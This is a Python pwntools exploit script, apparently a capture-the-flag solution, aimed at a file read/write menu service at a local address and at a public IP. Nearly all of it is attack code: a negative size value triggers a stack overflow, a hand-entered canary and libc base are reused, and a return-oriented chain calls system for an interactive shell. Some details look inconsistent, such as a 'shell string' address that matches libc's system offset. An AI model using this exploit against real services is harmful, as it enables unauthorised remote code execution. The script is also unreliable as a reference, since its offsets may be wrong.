# coding:utf-8
from pwn import *

LOCAL = True
if LOCAL:
    libc = ELF("../../libc-2.23.so")
    context.log_level = 'debug'
    io = remote("10.211.55.9", 22334)
else:
    libc = ELF("./libc.so.6")
    io = remote("104.236.0.107", 11111)

def mmenu(choice):
    io.recvuntil("> ")
    io.sendline(str(choice))

def prewrite(fname):
    mmenu(1)
    io.send(fname)

def preread(fname):
    mmenu(2)
    io.send(fname)


def mwrite(msize, content, key):
    mmenu(3)
    io.recvuntil("Size data")
    io.sendline(str(msize))
    io.recvuntil("Data> ")
    io.send(content)
    io.recvuntil("Key> ")
    io.send(key)

def mread(key):
    mmenu(3)
    io.recvuntil("Enter key> ")
    io.send(key)

def leakit():
    tmpkey = 'k'*0x10
    prewrite("mleaks\n")
    mwrite(-2147483647, "mleaks\n", tmpkey)
    # write
    prewrite("fish\n")
    canary_val = int(raw_input("canary:"), 16)
    libc.address = int(raw_input("libc:"), 16)
    log.info("canary:"+hex(canary_val))
    log.info("libc address:" + hex(libc.address))
    pop_rdi = libc.address + 0x21102
    sh_addr = libc.address + 0x45390
    payload = chr(0)*0x408 + p64(canary_val) + p64(0)
    payload += p64(pop_rdi) + p64(sh_addr) + p64(libc.symbols["system"])
    mwrite(-2147483647, payload+'\n', tmpkey)
    io.recvuntil(">")
    io.sendline(str(4))
    io.interactive()

if __name__ == "__main__":
    leakit()
    pause()

